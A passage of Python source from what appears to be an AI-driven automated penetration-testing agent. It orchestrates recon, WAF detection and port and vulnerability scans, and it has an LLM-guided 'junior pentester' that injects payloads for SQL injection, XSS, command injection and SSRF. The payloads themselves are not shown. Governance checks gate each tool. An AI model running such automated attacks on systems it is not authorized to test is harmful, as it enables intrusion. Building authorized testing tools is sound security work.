                               f"server={health_info.get('server', 'unknown')})")
            else:
                reason = health_info.get("reason", "unknown")
                await self.log("warning", f"[HEALTH] Target may be unhealthy: {reason}")
                await self.log("warning", "[HEALTH] Proceeding with caution - results may be unreliable")

        # Log governance scope and phase gate
        if self.governance:
            s = self.governance.scope
            types_info = f"{len(s.allowed_vuln_types)} types" if s.allowed_vuln_types else "all types"
            await self.log("info", f"[GOVERNANCE] Scope: {s.profile.value} | {types_info}")
            await self.log("info", f"[GOVERNANCE] Phase gate: {self.governance.governance_mode} | phase: {self.governance.current_phase}")

        # Phase 1: Reconnaissance + Sandbox tools (concurrent)
        if self.preset_recon:
            await self.log("info", "[PHASE 1/5] Recon SKIPPED (pre-populated by pipeline)")
            await self._update_progress(20, "Recon pre-populated")
        else:
            skip_target = self._check_skip("recon")
            if skip_target:
                await self.log("warning", f">> SKIPPING Reconnaissance -> jumping to {skip_target}")
                await self._update_progress(20, f"recon_skipped")
                # Still run sandbox tools even if recon is skipped
                await self._run_sandbox_scan()
            else:
                await self.log("info", "[PHASE 1/5] Reconnaissance + Sandbox tools")
                await asyncio.gather(
                    self._run_recon_only(),
                    self._run_sandbox_scan(),
                )
            await self._update_progress(20, "Reconnaissance complete")

        # Phase 1b: WAF Detection
        if self.waf_detector and not self._waf_result:
            try:
                self._waf_result = await self.waf_detector.detect(self.target)
                self._waf_result = self._filter_waf_by_confidence(self._waf_result)
                if self._waf_result and self._waf_result.detected_wafs:
                    for w in self._waf_result.detected_wafs:
                        waf_label = f"WAF:{w.name} ({w.confidence:.0%})"
                        if waf_label not in self.recon.technologies:
                            self.recon.technologies.append(waf_label)
                        await self.log("warning", f"[WAF] Detected: {w.name} "
                                       f"(confidence: {w.confidence:.0%})")
                    if self.request_engine and self._waf_result.recommended_delay > self.request_engine.default_delay:
                        self.request_engine.default_delay = self._waf_result.recommended_delay
                else:
                    await self.log("info", "[WAF] No WAF detected")
            except Exception as e:
                await self.log("debug", f"[WAF] Detection failed: {e}")

        # Governance: constrain recon depth if specified
        if self.governance and self.governance.scope.max_recon_depth:
            depth_order = {"quick": 0, "medium": 1, "full": 2}
            gov_depth = self.governance.scope.max_recon_depth
            if depth_order.get(gov_depth, 1) < depth_order.get(self.recon_depth, 1):
                self.recon_depth = gov_depth

        # Phase 2: AI Attack Surface Analysis
        skip_target = self._check_skip("analysis")
        if skip_target:
            await self.log("warning", f">> SKIPPING Analysis -> jumping to {skip_target}")
            attack_plan = self._default_attack_plan()
            if self.governance:
                attack_plan = self.governance.scope_attack_plan(attack_plan)
            await self._update_progress(30, f"analysis_skipped")
        else:
            await self.log("info", "[PHASE 2/5] AI Attack Surface Analysis")
            attack_plan = await self._ai_analyze_attack_surface()
            if self.governance:
                attack_plan = self.governance.scope_attack_plan(attack_plan)
            await self._update_progress(30, "Attack surface analyzed")

        # Phase 3: Vulnerability Testing
        skip_target = self._check_skip("testing")
        if skip_target:
            await self.log("warning", f">> SKIPPING Testing -> jumping to {skip_target}")
            await self._update_progress(70, f"testing_skipped")
        else:
            await self.log("info", "[PHASE 3/5] Vulnerability Testing")
            await self._test_all_vulnerabilities(attack_plan)
            await self._update_progress(70, "Vulnerability testing complete")

        # Phase 3.5: Differential Access Control Probes
        if self._diff_engine and not self.is_cancelled():
            await self.log("info", "[PHASE 3.5/5] Differential Access Control Testing")
            await self._run_differential_probes()
            await self._update_progress(75, "Differential testing complete")

        # Phase 4: AI Finding Enhancement
        skip_target = self._check_skip("enhancement")
        if skip_target:
            await self.log("warning", f">> SKIPPING Enhancement -> jumping to {skip_target}")
            await self._update_progress(90, f"enhancement_skipped")
        else:
            await self.log("info", "[PHASE 4/5] AI Finding Enhancement")
            await self._ai_enhance_findings()
            await self._update_progress(90, "Findings enhanced")

        # Phase 5: Report Generation
        await self.log("info", "[PHASE 5/5] Report Generation")
        report = await self._generate_full_report()
        await self._update_progress(100, "Assessment complete")

        return report

    async def _run_sandbox_scan(self):
        """Run Nuclei + Naabu via Docker sandbox if available."""
        if not HAS_SANDBOX:
            await self.log("info", "  Sandbox not available (docker SDK missing), skipping")
            return

        try:
            sandbox = await get_sandbox(scan_id=self.scan_id)
            self._sandbox = sandbox  # Store ref so __aexit__ can clean up
            if not sandbox.is_available:
                await self.log("info", "  Sandbox container not running, skipping sandbox tools")
                return

            await self.log("info", "  [Sandbox] Running Nuclei vulnerability scanner...")
            import time as _time
            _nuclei_start = _time.time()
            _nuclei_kwargs = dict(
                target=self.target,
                severity="critical,high,medium",
                rate_limit=150,
                timeout=600,
            )
            # Governance: check if nuclei is allowed in current phase
            if self.governance:
                _nuclei_decision = self.governance.check_action("nuclei")
                if not _nuclei_decision.allowed:
                    await self.log("warning", f"[GOVERNANCE] Nuclei blocked: {_nuclei_decision.reason}")
                    return
                _gov_tags = self.governance.get_nuclei_template_tags()
                if _gov_tags:
                    _nuclei_kwargs["tags"] = _gov_tags
            nuclei_result = await sandbox.run_nuclei(**_nuclei_kwargs)
            _nuclei_duration = round(_time.time() - _nuclei_start, 2)

            # Track tool execution
            self.tool_executions.append({
                "tool": "nuclei",
                "command": f"nuclei -u {self.target} -severity critical,high,medium -rl 150",
                "duration": _nuclei_duration,
                "findings_count": len(nuclei_result.findings) if nuclei_result.findings else 0,
                "stdout_preview": nuclei_result.stdout[:2000] if hasattr(nuclei_result, 'stdout') and nuclei_result.stdout else "",
                "stderr_preview": nuclei_result.stderr[:500] if hasattr(nuclei_result, 'stderr') and nuclei_result.stderr else "",
                "exit_code": getattr(nuclei_result, 'exit_code', 0),
            })

            if nuclei_result.findings:
                await self.log("info", f"  [Sandbox] Nuclei found {len(nuclei_result.findings)} issues ({_nuclei_duration}s)")
                for nf in nuclei_result.findings:
                    # Import Nuclei findings as agent findings
                    vuln_type = nf.get("vulnerability_type", "vulnerability")
                    if vuln_type not in self.memory.tested_combinations:
                        finding = Finding(
                            id=f"nuclei_{nf.get('template_id', 'unknown')}_{len(self.memory.findings)}",
                            title=nf.get("title", "Nuclei Finding"),
                            severity=nf.get("severity", "info"),
                            vulnerability_type=vuln_type,
                            affected_endpoint=nf.get("affected_endpoint", self.target),
                            evidence=f"Nuclei template: {nf.get('template_id', 'unknown')}. {nf.get('evidence', '')}",
                            ai_verified=False,
                            description=nf.get("description", ""),
                            remediation=nf.get("remediation", ""),
                        )
                        await self._add_finding(finding)
            else:
                await self.log("info", f"  [Sandbox] Nuclei: no findings ({_nuclei_duration}s)")

            # Naabu port scan (governance may skip)
            parsed = urlparse(self.target)
            host = parsed.hostname or parsed.netloc
            _naabu_allowed = not self.governance or self.governance.should_port_scan()
            if _naabu_allowed and self.governance:
                _naabu_decision = self.governance.check_action("naabu")
                _naabu_allowed = _naabu_decision.allowed
                if not _naabu_allowed:
                    await self.log("warning", f"[GOVERNANCE] Naabu blocked: {_naabu_decision.reason}")
            if host and _naabu_allowed:
                await self.log("info", "  [Sandbox] Running Naabu port scanner...")
                _naabu_start = _time.time()
                naabu_result = await sandbox.run_naabu(
                    target=host,
                    top_ports=1000,
                    rate=1000,
                    timeout=120,
                )
                _naabu_duration = round(_time.time() - _naabu_start, 2)

                # Track tool execution
                self.tool_executions.append({
                    "tool": "naabu",
                    "command": f"naabu -host {host} -top-ports 1000 -rate 1000",
                    "duration": _naabu_duration,
                    "findings_count": len(naabu_result.findings) if naabu_result.findings else 0,
                    "stdout_preview": naabu_result.stdout[:2000] if hasattr(naabu_result, 'stdout') and naabu_result.stdout else "",
                    "stderr_preview": naabu_result.stderr[:500] if hasattr(naabu_result, 'stderr') and naabu_result.stderr else "",
                    "exit_code": getattr(naabu_result, 'exit_code', 0),
                })

                if naabu_result.findings:
                    open_ports = [str(f["port"]) for f in naabu_result.findings]
                    await self.log("info", f"  [Sandbox] Naabu found {len(open_ports)} open ports: {', '.join(open_ports[:20])} ({_naabu_duration}s)")
                    # Store port info in recon data
                    self.recon.technologies.append(f"Open ports: {', '.join(open_ports[:30])}")
                    self.recon.ports = open_ports

                    # Feed discovered ports into endpoint discovery (Item 3)
                    target_port = str(parsed.port or (443 if parsed.scheme == 'https' else 80))
                    for port in open_ports[:10]:
                        if port != target_port:
                            port_url = f"http://{host}:{port}"
                            try:
                                async with self.session.get(port_url + "/", ssl=False, allow_redirects=True) as port_resp:
                                    if port_resp.status < 500:
                                        self.recon.endpoints.append({
                                            "url": port_url, "method": "GET",
                                            "status": port_resp.status, "path": "/",
                                            "source": "naabu_port_probe",
                                        })
                                        await self.log("info", f"  [Sandbox] Port {port} responds HTTP {port_resp.status}")
                            except Exception:
                                pass
                else:
                    await self.log("info", "  [Sandbox] Naabu: no open ports found")

                # Item 7: Run nmap -sV -sC on discovered open ports for service detection
                nmap_ports = ",".join(open_ports[:30]) if naabu_result.findings else None
                if nmap_ports and hasattr(sandbox, 'run_nmap'):
                    try:
                        await self.log("info", f"  [Sandbox] Running nmap service detection on {len(open_ports)} ports...")
                        _nmap_start = _time.time()
                        nmap_result = await sandbox.run_nmap(
                            target=host,
                            ports=nmap_ports,
                            scripts=True,
                            timeout=180,
                        )
                        _nmap_duration = round(_time.time() - _nmap_start, 2)

                        self.tool_executions.append({
                            "tool": "nmap",
                            "command": f"nmap -sV -sC -p {nmap_ports} {host}",
                            "duration": _nmap_duration,
                            "stdout_preview": nmap_result.stdout[:3000] if hasattr(nmap_result, 'stdout') and nmap_result.stdout else "",
                            "stderr_preview": nmap_result.stderr[:500] if hasattr(nmap_result, 'stderr') and nmap_result.stderr else "",
                            "exit_code": getattr(nmap_result, 'exit_code', 0),
                        })

                        if nmap_result.stdout:
                            await self.log("info", f"  [Sandbox] nmap completed ({_nmap_duration}s)")
                            # Extract service info from nmap output
                            for line in nmap_result.stdout.split('\n'):
                                if '/tcp' in line and 'open' in line:
                                    service_info = line.strip()
                                    if service_info not in self.recon.technologies:
                                        self.recon.technologies.append(f"nmap: {service_info}")
                    except Exception as nmap_err:
                        await self.log("debug", f"  [Sandbox] nmap error: {nmap_err}")

        except Exception as e:
            await self.log("warning", f"  Sandbox scan error: {e}")

    async def _run_auto_pentest(self) -> Dict:
        """Parallel auto pentest: 3 concurrent streams + deep analysis + report.

        Architecture:
          Stream 1 (Recon)  ──→ asyncio.Queue ──→ Stream 2 (Junior Pentester)
          Stream 3 (Tool Runner) runs sandbox tools + AI-decided tools
          All streams feed findings in real-time via callbacks.

        After parallel phase completes:
          Deep Analysis: AI attack surface analysis + comprehensive 100-type testing
          Finalization: Screenshots + AI enhancement + report generation
        """
        await self._update_progress(0, "Auto pentest starting")
        await self.log("info", "=" * 60)
        await self.log("info", "  PARALLEL AUTO PENTEST MODE")
        await self.log("info", "  3 concurrent streams | AI-powered | 100 vuln types")
        await self.log("info", "=" * 60)

        # Override custom_prompt with DEFAULT_ASSESSMENT_PROMPT for auto mode
        if not self.custom_prompt:
            self.custom_prompt = DEFAULT_ASSESSMENT_PROMPT

        # Shared state for parallel streams
        self._endpoint_queue = asyncio.Queue()
        self._recon_complete = asyncio.Event()
        self._tools_complete = asyncio.Event()
        self._stream_findings_count = 0
        self._junior_tested_types: set = set()

        # ── CONCURRENT PHASE (0-50%): 3 parallel streams ──
        await asyncio.gather(
            self._stream_recon(),            # Stream 1: Recon pipeline
            self._stream_junior_pentest(),   # Stream 2: Immediate AI testing
            self._stream_tool_runner(),      # Stream 3: Dynamic tool execution
        )

        parallel_findings = len(self.findings)
        await self.log("info", f"  Parallel phase complete: {parallel_findings} findings, "
                       f"{len(self._junior_tested_types)} types pre-tested")
        await self._update_progress(50, "Parallel streams complete")

        # ── DEEP ANALYSIS PHASE (50-75%): Full testing with complete context ──
        await self.log("info", "[DEEP] AI Attack Surface Analysis + Comprehensive Testing")
        attack_plan = await self._ai_analyze_attack_surface()

        # Merge AI-recommended types with default plan
        default_plan = self._default_attack_plan()
        ai_types = attack_plan.get("priority_vulns", [])
        all_types = default_plan["priority_vulns"]
        merged_types = list(dict.fromkeys(ai_types + all_types))

        # Remove types already tested by junior pentest stream
        remaining = [t for t in merged_types if t not in self._junior_tested_types]
        attack_plan["priority_vulns"] = remaining
        await self.log("info", f"  {len(remaining)} remaining types "
                       f"({len(self._junior_tested_types)} already tested by junior)")
        await self._update_progress(55, "Deep: attack surface analyzed")

        await self.log("info", "[DEEP] Comprehensive Vulnerability Testing")
        await self._test_all_vulnerabilities(attack_plan)
        await self._update_progress(75, "Deep testing complete")

        # ── DIFFERENTIAL ACCESS CONTROL (75-80%) ──
        if self._diff_engine and not self.is_cancelled():
            await self.log("info", "[DIFF] Differential Access Control Testing")
            await self._run_differential_probes()
            await self._update_progress(80, "Differential testing complete")

        # ── FINALIZATION PHASE (80-100%) ──
        await self.log("info", "[FINAL] Screenshot Capture")
        for finding in self.findings:
            if self.is_cancelled():
                break
            if not finding.screenshots:
                await self._capture_finding_screenshot(finding)
        await self._update_progress(85, "Screenshots captured")

        await self.log("info", "[FINAL] AI Finding Enhancement")
        await self._ai_enhance_findings()
        await self._update_progress(92, "Findings enhanced")

        await self.log("info", "[FINAL] Report Generation")
        report = await self._generate_full_report()
        await self._update_progress(100, "Auto pentest complete")

        # Flush execution history
        if hasattr(self, 'execution_history'):
            self.execution_history.flush()

        await self.log("info", "=" * 60)
        await self.log("info", f"  AUTO PENTEST COMPLETE: {len(self.findings)} findings")
        await self.log("info", "=" * 60)

        return report

    # ── Stream 1: Recon Pipeline ──

    async def _stream_recon(self):
        """Stream 1: Reconnaissance — feeds discovered endpoints to testing stream."""
        try:
            await self.log("info", "[STREAM 1] Recon pipeline starting")
            await self._update_progress(2, "Recon: initial probe")

            # Phase 1: Initial probe
            await self._initial_probe()
            # Push initial endpoints to testing queue immediately
            for ep in self.recon.endpoints:
                await self._endpoint_queue.put(ep)
            await self._update_progress(8, "Recon: crawling endpoints")

            if self.is_cancelled():
                return

            # Phase 2: Endpoint discovery
            prev_count = len(self.recon.endpoints)
            await self._discover_endpoints()
            # Push newly discovered endpoints to queue
            for ep in self.recon.endpoints[prev_count:]:
                await self._endpoint_queue.put(ep)
            await self._update_progress(15, "Recon: discovering parameters")

            if self.is_cancelled():
                return

            # Phase 3: Parameter discovery
            await self._discover_parameters()
            await self._update_progress(20, "Recon: technology detection")

            # Phase 4: Technology detection
            await self._detect_technologies()

            # Phase 5: WAF detection
            if self.waf_detector:
                try:
                    self._waf_result = await self.waf_detector.detect(self.target)
                    self._waf_result = self._filter_waf_by_confidence(self._waf_result)
                    if self._waf_result and self._waf_result.detected_wafs:
                        for w in self._waf_result.detected_wafs:
                            waf_label = f"WAF:{w.name} ({w.confidence:.0%})"
                            self.recon.technologies.append(waf_label)
                            await self.log("warning", f"  [WAF] Detected: {w.name} "
                                           f"(confidence: {w.confidence:.0%}, method: {w.detection_method})")
                        # Adjust request delay based on WAF recommendation
                        if self.request_engine and self._waf_result.recommended_delay > self.request_engine.default_delay:
                            self.request_engine.default_delay = self._waf_result.recommended_delay
                            await self.log("info", f"  [WAF] Adjusted request delay to {self._waf_result.recommended_delay:.1f}s")
                    else:
                        await self.log("info", "  [WAF] No WAF detected")
                except Exception as e:
                    await self.log("debug", f"  [WAF] Detection failed: {e}")

            # Phase 6: Validate endpoints before handing to pentester
            await self._validate_endpoints()

            ep_count = len(self.recon.endpoints)
            param_count = sum(len(v) if isinstance(v, list) else 1 for v in self.recon.parameters.values())
            tech_count = len(self.recon.technologies)
            await self.log("info", f"  [STREAM 1] Recon complete: "
                           f"{ep_count} endpoints, {param_count} params, {tech_count} techs")
        except Exception as e:
            await self.log("warning", f"  [STREAM 1] Recon error: {e}")
        finally:
            self._recon_complete.set()

    # ── Stream 2: Junior Pentester ──

    async def _stream_junior_pentest(self):
        """Stream 2: Junior pentester — immediate testing + queue consumer.

        Starts testing the target URL right away without waiting for recon.
        Then consumes endpoints from the queue as recon discovers them.
        """
        try:
            await self.log("info", "[STREAM 2] Junior pentester starting")

            # Priority vulnerability types to test immediately
            priority_types = [
                "xss_reflected", "sqli_error", "sqli_blind", "command_injection",
                "lfi", "path_traversal", "open_redirect", "ssti",
                "crlf_injection", "ssrf", "xxe",
            ]

            # Ask AI for initial prioritization (quick call)
            if self.llm.is_available():
                try:
                    junior_prompt = (
                        f"You are a junior penetration tester. Target: {self.target}\n"
                        f"What are the 5-10 most likely vulnerability types to test first?\n"
                        f"Respond ONLY with JSON: {{\"test_types\": [\"type1\", \"type2\", ...]}}"
                    )
                    data = await self.llm.generate_json(
                        junior_prompt,
                        system=get_system_prompt("strategy"),
                        task_type="junior_tester",
                    )
                    ai_types = [t for t in (data or {}).get("test_types", [])
                                if t in self.VULN_TYPE_MAP]
                    if ai_types:
                        priority_types = list(dict.fromkeys(ai_types + priority_types))
                        await self.log("info", f"  [STREAM 2] AI prioritized: {', '.join(ai_types[:5])}")
                except Exception:
                    pass  # Use defaults

            # ── IMMEDIATE: Test target URL with priority vulns ──
            await self.log("info", f"  [STREAM 2] Immediate testing: "
                           f"{len(priority_types[:15])} priority types on target")
            for vtype in priority_types[:15]:
                if self.is_cancelled():
                    return
                self._junior_tested_types.add(vtype)
                try:
                    await self._junior_test_single(self.target, vtype)
                except Exception:
                    pass
            await self._update_progress(30, "Junior: initial tests done")

            # ── QUEUE CONSUMER: Test endpoints as recon discovers them ──
            await self.log("info", "  [STREAM 2] Consuming endpoint queue from recon")
            tested_urls = {self.target}
            while True:
                if self.is_cancelled():
                    return
                try:
                    ep = await asyncio.wait_for(self._endpoint_queue.get(), timeout=3.0)
                    url = ep.get("url", ep) if isinstance(ep, dict) else str(ep)
                    if url and url not in tested_urls and url.startswith("http"):
                        tested_urls.add(url)
                        # Quick test top 5 types on each new endpoint
                        for vtype in priority_types[:5]:
                            if self.is_cancelled():
                                return
                            try:
                                await self._junior_test_single(url, vtype)
                            except Exception:
                                pass
                except asyncio.TimeoutError:
                    if self._recon_complete.is_set() and self._endpoint_queue.empty():
                        break
                    continue

            await self.log("info", f"  [STREAM 2] Junior complete: "
                           f"{self._stream_findings_count} findings from {len(tested_urls)} URLs")
        except Exception as e:
            await self.log("warning", f"  [STREAM 2] Junior error: {e}")

    async def _junior_test_single(self, url: str, vuln_type: str):
        """Quick single-type test (max 3 payloads) for junior pentester stream."""
        if self.is_cancelled():
            return

        # Get endpoint params from recon if available
        parsed = urlparse(url)
        params_raw = self.recon.parameters.get(url, {})
        if isinstance(params_raw, dict):
            params = list(params_raw.keys())[:3]
        elif isinstance(params_raw, list):
            params = params_raw[:3]
        else:
            params = []
        if not params:
            params = list(parse_qs(parsed.query).keys())[:3]
        if not params:
            params = ["id", "q", "search"]  # Defaults

        # Use limited payloads for speed
        payloads = self._get_payloads(vuln_type)[:3]
        if not payloads:
            return

        method = "GET"
        injection_config = self.VULN_INJECTION_POINTS.get(vuln_type, {"point": "parameter"})
        inj_point = injection_config.get("point", "parameter")
        # For "both" types, just test params in junior mode
        if inj_point == "both":
            inj_point = "parameter"

        for param in params[:2]:
            if self.is_cancelled():
                return
            if self.memory.was_tested(url, param, vuln_type):
                continue
            for payload in payloads:
                if self.is_cancelled():
                    return
                header_name = ""
                if inj_point == "header":
                    headers_list = injection_config.get("headers", ["X-Forwarded-For"])
                    header_name = headers_list[0] if headers_list else "X-Forwarded-For"

                test_resp = await self._make_request_with_injection(
                    url, method, payload,
                    injection_point=inj_point,
                    param_name=param,
                    header_name=header_name,
                )
                if not test_resp:
                    continue

                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, test_resp
                )
                if is_vuln:
                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        vuln_type, url, param, payload, evidence, test_resp,
                        injection_point=inj_point
                    )
                    if finding:
                        await self._add_finding(finding)
                        self._stream_findings_count += 1
                        return  # One finding per type per URL is enough for junior

                self.memory.record_test(url, param, vuln_type, [payload], False)

    # ── Stream 3: Dynamic Tool Runner ──

    async def _stream_tool_runner(self):
        """Stream 3: Dynamic tool execution (sandbox + AI-decided tools).

        Runs core tools (Nuclei/Naabu) immediately, then waits for recon
        to complete before asking AI which additional tools to run.
        """
        try:
            await self.log("info", "[STREAM 3] Tool runner starting")

            # Run core tools immediately (don't wait for recon)
            await self._run_sandbox_scan()  # Nuclei + Naabu

            if self.is_cancelled():
                return

            # Wait for recon to have tech data before AI tool decisions
            try:
                await asyncio.wait_for(self._recon_complete.wait(), timeout=120)
            except asyncio.TimeoutError:
                await self.log("warning", "  [STREAM 3] Timeout waiting for recon, proceeding")

            if self.is_cancelled():
                return

            # AI-driven tool selection based on discovered tech stack
            tool_decisions = await self._ai_decide_tools()

            if tool_decisions:
                await self.log("info", f"  [STREAM 3] AI selected "
                               f"{len(tool_decisions)} additional tools")
                for decision in tool_decisions[:5]:
                    if self.is_cancelled():
                        return
                    await self._execute_dynamic_tool(decision)

            await self.log("info", "  [STREAM 3] Tool runner complete")
        except Exception as e:
            await self.log("warning", f"  [STREAM 3] Tool error: {e}")
        finally:
            self._tools_complete.set()

    # ── AI Tool Decision Engine ──

    async def _ai_decide_tools(self) -> List[Dict]:
        """Ask AI which additional tools to run based on discovered tech stack."""
        if not self.llm.is_available():
            return []

        tech_str = ", ".join(self.recon.technologies[:20]) or "unknown"
        endpoints_preview = "\n".join(
            f"  - {ep.get('url', ep) if isinstance(ep, dict) else ep}"
            for ep in (self.recon.endpoints[:15]
                       if self.recon.endpoints else [{"url": self.target}])
        )

        prompt = f"""You are a senior penetration tester planning tool usage.

Target: {self.target}
Technologies detected: {tech_str}
Endpoints discovered:
{endpoints_preview}

Available sandbox tools (CLI flags as args string):
- nmap (network scanner with scripts)
- httpx (HTTP probing + tech detection)
- subfinder (subdomain enumeration)
- katana (web crawler)
- dalfox (XSS scanner)
- nikto (web server scanner)
- sqlmap (SQL injection automation)
- ffuf (web fuzzer)
- gobuster (directory brute-forcer)
- dnsx (DNS toolkit)
- whatweb (technology fingerprinting)
- wafw00f (WAF detection)
- arjun (parameter discovery)

Available MCP tools (provide structured JSON dict as args):
- screenshot_capture: Browser screenshot (args: {{"url": "https://..."}})
- technology_detect: Tech fingerprinting (args: {{"url": "https://..."}})
- dns_lookup: DNS records (args: {{"domain": "example.com", "record_type": "A"}})
- execute_cvemap: CVE database lookup (args: {{"severity": "critical", "product": "apache"}})
- execute_tlsx: TLS/SSL analysis (args: {{"target": "example.com"}})
- execute_asnmap: ASN/CIDR mapping (args: {{"target": "1.2.3.4"}})
- execute_interactsh: OOB callback detection (args: {{"action": "register"}})
- oob_verify: Simplified OOB verification (args: {{"action": "register"}} or {{"action": "poll", "expected_protocol": "dns"}})
- time_oracle: Statistical timing analysis (args: {{"url": "https://...", "iterations": 10}})
- execute_nuclei: Nuclei vuln scanner (args: {{"target": "https://...", "severity": "critical,high"}})
- execute_naabu: Fast port scanner (args: {{"target": "example.com", "top_ports": 100}})
- sandbox_exec: Run any sandbox tool (args: {{"tool": "nmap", "args": "-sV target"}})
- execute_mapcidr: CIDR operations (args: {{"cidr": "192.168.0.0/16", "operation": "count"}})
- execute_alterx: Subdomain permutations (args: {{"domain": "example.com"}})
- execute_shuffledns: Mass DNS brute-force (args: {{"domain": "example.com"}})
- execute_cloudlist: Cloud asset enumeration (args: {{"provider": "aws"}})
- proxy_capture: Set proxy capture filter (args: {{"filter_expr": "~d example.com"}})
- proxy_flows: Retrieve captured flows (args: {{"limit": 50}})
- proxy_replay: Replay a flow with mods (args: {{"flow_id": "abc", "modify_headers": {{}}}})

NOTE: Pick 1-3 MOST USEFUL additional tools for this target.
For sandbox tools: {{"tool": "httpx", "args": "-u {self.target} -tech-detect", "reason": "..."}}
For MCP tools: {{"tool": "execute_cvemap", "args": {{"severity": "critical"}}, "reason": "..."}}

Respond ONLY with a JSON array:
[{{"tool": "tool_name", "args": "...", "reason": "brief reason"}}]"""

        try:
            decisions = await self.llm.generate_json(
                prompt,
                system=get_system_prompt("strategy"),
                task_type="tool_selection",
                array=True,
            )
            # Validate tool names against allowed set
            allowed = {
                # Sandbox CLI tools
                "nmap", "httpx", "subfinder", "katana", "dalfox", "nikto",
                "sqlmap", "ffuf", "gobuster", "dnsx", "whatweb", "wafw00f", "arjun",
                # MCP tools
                "screenshot_capture", "technology_detect", "dns_lookup",
                "execute_cvemap", "execute_tlsx", "execute_asnmap", "execute_interactsh",
                "execute_nuclei", "execute_naabu", "sandbox_exec",
                "execute_mapcidr", "execute_alterx", "execute_shuffledns",
                "execute_cloudlist",
                "time_oracle", "oob_verify",
                "proxy_capture", "proxy_flows", "proxy_replay",
            }
            validated = [d for d in (decisions or [])
                         if isinstance(d, dict) and d.get("tool") in allowed]
            return validated[:5]
        except Exception as e:
            await self.log("info", f"  [STREAM 3] AI tool selection skipped: {e}")
            return []

    # MCP tool names that should be routed through MCP client
    MCP_TOOLS = {
        # Core tools
        "screenshot_capture", "payload_delivery", "dns_lookup", "port_scan",
        "technology_detect", "subdomain_enumerate", "save_finding",
        "get_vuln_prompt",
        # Timing & blind injection
        "time_oracle", "oob_verify",
        # Sandbox tools
        "execute_nuclei", "execute_naabu", "sandbox_health", "sandbox_exec",
        # ProjectDiscovery extended suite
        "execute_cvemap", "execute_tlsx", "execute_asnmap", "execute_mapcidr",
        "execute_alterx", "execute_shuffledns", "execute_cloudlist",
        "execute_interactsh", "execute_notify",
        # Proxy tools (mitmproxy)
        "proxy_status", "proxy_flows", "proxy_capture", "proxy_replay",
        "proxy_intercept", "proxy_clear", "proxy_export",
    }

    async def run_mcp_tool(self, tool_name: str, arguments: Optional[Dict] = None) -> Optional[Dict]:
        """Execute a tool via MCP. Returns parsed dict or None."""
        if not self.mcp_client or not self.mcp_client.enabled:
            return None

        # Governance: check if MCP tool is allowed in current phase
        if self.governance:
            decision = self.governance.check_action(tool_name, arguments)
            if not decision.allowed:
                await self.log("warning", f"[GOVERNANCE] MCP tool '{tool_name}' blocked: {decision.reason}")
                return None

        try:
            result = await self.mcp_client.try_tool(tool_name, arguments or {})
            if result:
                return json.loads(result)
        except (json.JSONDecodeError, Exception):
            pass
        return None

    async def _execute_dynamic_tool(self, decision: Dict):
        """Execute an AI-selected tool via MCP or sandbox."""
        tool_name = decision.get("tool", "")
        args = decision.get("args", "")
        reason = decision.get("reason", "")

        await self.log("info", f"  [TOOL] Running {tool_name}: {reason}")

        # Route MCP tools through MCP client
        if tool_name in self.MCP_TOOLS:
            mcp_args = args if isinstance(args, dict) else {"target": self.target}
            mcp_result = await self.run_mcp_tool(tool_name, mcp_args)
            if mcp_result:
                self.tool_executions.append({
                    "tool": tool_name,
                    "command": f"MCP:{tool_name}",
                    "reason": reason,
                    "via": "mcp",
                    "findings_count": len(mcp_result.get("findings", [])) if isinstance(mcp_result, dict) else 0,
                })
                if isinstance(mcp_result, dict):
                    for finding in mcp_result.get("findings", []):
                        await self._process_tool_finding(finding, tool_name)
                await self.log("info", f"  [MCP] {tool_name}: completed")
                return
            # Fall through to sandbox if MCP failed

        try:
            if not HAS_SANDBOX:
                await self.log("info", f"  [TOOL] Sandbox unavailable, skipping {tool_name}")
                return

            if not hasattr(self, '_sandbox') or self._sandbox is None:
                self._sandbox = await get_sandbox(scan_id=self.scan_id)

            if not self._sandbox.is_available:
                await self.log("info", f"  [TOOL] Sandbox not running, skipping {tool_name}")
                return

            # Execute with safety timeout
            result = await self._sandbox.run_tool(tool_name, args, timeout=180)

            # Track tool execution
            self.tool_executions.append({
                "tool": tool_name,
                "command": f"{tool_name} {args}",
                "reason": reason,
                "duration": result.duration_seconds,
                "exit_code": result.exit_code,
                "findings_count": len(result.findings) if result.findings else 0,
                "stdout_preview": (result.stdout or "")[:500],
            })

            # Process findings from tool
            if result.findings:
                await self.log("info", f"  [TOOL] {tool_name}: "
                               f"{len(result.findings)} findings")
                for tool_finding in result.findings[:20]:
                    await self._process_tool_finding(tool_finding, tool_name)
            else:
                await self.log("info", f"  [TOOL] {tool_name}: completed "
                               f"({result.duration_seconds:.1f}s, no findings)")

            # Feed tool output back into recon context
            self._ingest_tool_results(tool_name, result)

        except Exception as e:
            await self.log("warning", f"  [TOOL] {tool_name} failed: {e}")

    def _ingest_tool_results(self, tool_name: str, result):
        """Feed tool output back into recon context for richer analysis."""
        if not result or not result.findings:
            return

        if tool_name == "httpx":
            for f in result.findings:
                if f.get("url"):
                    self.recon.endpoints.append({
                        "url": f["url"],
                        "status": f.get("status_code", 0)
                    })
                for tech in f.get("technologies", []):
                    if tech not in self.recon.technologies:
                        self.recon.technologies.append(tech)
        elif tool_name == "subfinder":
            for f in result.findings:
                sub = f.get("subdomain", "")
                if sub and sub not in self.recon.subdomains:
                    self.recon.subdomains.append(sub)
        elif tool_name in ("katana", "gobuster", "ffuf"):
            for f in result.findings:
                url = f.get("url", f.get("path", ""))
                if url:
                    self.recon.endpoints.append({
                        "url": url,
                        "status": f.get("status_code", 200)
                    })
        elif tool_name == "wafw00f" and result.stdout:
            waf_info = f"WAF: {result.stdout.strip()[:100]}"
            if waf_info not in self.recon.technologies:
                self.recon.technologies.append(waf_info)
        elif tool_name == "arjun":
            for f in result.findings:
                url = f.get("url", self.target)
                params = f.get("params", [])
                if url not in self.recon.parameters:
                    self.recon.parameters[url] = params
                elif isinstance(self.recon.parameters[url], list):
                    self.recon.parameters[url].extend(params)
        elif tool_name == "whatweb":
            for f in result.findings:
                for tech in f.get("technologies", []):
                    if tech not in self.recon.technologies:
                        self.recon.technologies.append(tech)

    async def _process_tool_finding(self, tool_finding: Dict, tool_name: str):
        """Convert a tool-generated finding into an agent Finding."""
        title = tool_finding.get("title", f"{tool_name} finding")
        severity = tool_finding.get("severity", "info")
        vuln_type = tool_finding.get("vulnerability_type", "vulnerability")
        endpoint = tool_finding.get("affected_endpoint",
                                    tool_finding.get("url", self.target))
        evidence = tool_finding.get("evidence",
                                    tool_finding.get("matcher-name", ""))

